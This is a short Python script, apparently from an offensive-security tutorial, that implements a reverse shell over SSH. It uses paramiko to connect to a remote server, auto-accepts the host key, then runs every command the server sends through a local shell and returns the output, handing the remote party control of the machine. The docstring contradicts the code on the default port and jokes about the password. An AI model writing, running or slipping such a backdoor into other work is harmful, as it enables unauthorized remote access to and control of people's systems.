#!/usr/bin/env python3

import os
import paramiko
import subprocess


def ssh_cmd(ip=None, port=2222, username=os.environ['USER'], password=None, cmd='id'):
    """
    run a command over ssh with sensible defaults
    :param ip: ip/hostname to connect (default is effectively 'localhost')
    :param username: username to connect as, defaults to $USER from os env of process
    :param password: hunter2
    :param cmd: command to run, defaults to 'id'
    :param port: port to connect to, defaults to 22 of course
    :return:
    """
    # define client instance and set host key to autoadd - YOLO!
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # connect
    client.connect(hostname=ip, port=port, username=username, password=password, passphrase='')
    # get a session from our connection
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.send(cmd)
        print(ssh_session.recv(4096).decode("utf-8"))

        while ssh_session.active:
            cmd = ssh_session.recv(4096)
            # get the command from "ssh server"
            try:
                cmd_out = subprocess.check_output(cmd, shell=True)
                ssh_session.send(cmd_out)
            except Exception as ex:
                ssh_session.send(str(ex))

        client.close()

    return


ssh_cmd(cmd='ClientConnected')
